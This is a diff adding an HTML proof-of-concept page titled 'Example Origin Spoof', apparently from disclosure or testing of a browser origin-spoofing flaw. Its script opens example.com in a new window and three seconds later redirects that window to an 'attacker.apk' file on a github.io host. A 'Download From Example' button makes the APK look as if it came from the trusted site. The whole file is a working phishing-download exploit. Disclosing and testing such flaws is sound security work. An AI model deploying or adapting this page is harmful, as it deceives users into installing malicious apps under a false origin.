@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Example Origin Spoof</title>
+    <style>
+      .button {
+        background-color: #4caf50;
+        border: none;
+        color: white;
+        padding: 15px 32px;
+        text-align: center;
+        text-decoration: none;
+        display: inline-block;
+        font-size: 16px;
+        margin: 4px 2px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <script>
+      function a() {
+        const w = window.open("https://example.com/", "example.com");
+
+        setTimeout(function () {
+          if (w) {
+            w.location.href =
+              "https://azza0x1a.github.io/safarispoof/attacker.apk";
+          }
+        }, 3000);
+      }
+    </script>
+
+    <center>
+      <input
+        type="button"
+        class="button"
+        value="Download From Example"
+        onclick="a()"
+      />
+    </center>
+  </body>
+</html>
